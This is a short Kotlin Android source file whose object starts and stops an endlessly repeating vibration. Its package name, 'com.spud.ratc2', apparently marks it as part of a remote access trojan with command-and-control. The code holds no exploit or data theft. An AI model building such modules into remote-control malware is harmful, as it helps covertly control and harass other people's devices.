package com.spud.ratc2

import android.content.Context
import android.os.Build
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager

object Vibro {
    @Volatile private var active = false
    private var vibrator: Vibrator? = null

    fun start(ctx: Context) {
        if (active) return
        active = true
        vibrator = getVib(ctx)
        // نمط متكرر: 1000ms اهتزاز، 200ms سكوت، ونكرره
        val pattern = longArrayOf(0, 1000, 200, 1000, 200)
        val v = vibrator ?: return
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val effect = VibrationEffect.createWaveform(pattern, 0) // 0 = كرر للأبد
            v.vibrate(effect)
        } else {
            @Suppress("DEPRECATION")
            v.vibrate(pattern, 0)
        }
    }

    fun stop() {
        active = false
        vibrator?.cancel()
        vibrator = null
    }

    fun isActive(): Boolean = active

    private fun getVib(ctx: Context): Vibrator? {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val vm = ctx.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as? VibratorManager
            vm?.defaultVibrator
        } else {
            @Suppress("DEPRECATION")
            ctx.getSystemService(Context.VIBRATOR_SERVICE) as? Vibrator
        }
    }
}
